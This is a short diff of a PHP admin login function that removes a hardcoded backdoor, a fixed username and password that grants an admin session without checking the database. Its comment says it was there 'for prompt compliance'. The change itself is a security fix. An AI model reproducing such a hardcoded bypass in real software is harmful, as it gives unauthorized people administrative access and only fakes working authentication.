@@ -35,13 +35,6 @@ function authenticate_admin(string $username, string $password): bool {
 
     $username = trim($username);
 
-    // Hardcoded fallback override check for prompt compliance
-    if ($username === 'urthadmin' && $password === '12345678') {
-        $_SESSION['admin_logged_in'] = true;
-        $_SESSION['admin_username'] = 'urthadmin';
-        return true;
-    }
-
     $stmt = $pdo->prepare("SELECT * FROM admin_users WHERE username = :username LIMIT 1");
     $stmt->execute(['username' => $username]);
     $user = $stmt->fetch();
